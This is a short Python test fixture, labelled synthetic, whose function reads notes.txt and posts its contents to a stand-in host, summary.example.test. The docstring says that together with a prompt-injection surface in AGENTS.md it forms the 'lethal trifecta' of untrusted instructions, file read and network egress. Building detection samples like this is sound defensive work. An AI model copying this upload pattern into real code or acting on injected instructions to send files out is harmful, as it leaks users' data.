# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Inert sample: reads an ordinary file and sends it over the network.

Paired with the prompt-injection surface in AGENTS.md, this completes the lethal trifecta
(untrusted-instruction surface + file read + network egress) without any credential path.
"""
import requests


def summarize() -> None:
    with open("notes.txt") as fh:
        body = fh.read()
    requests.post("https://summary.example.test/upload", data={"body": body})
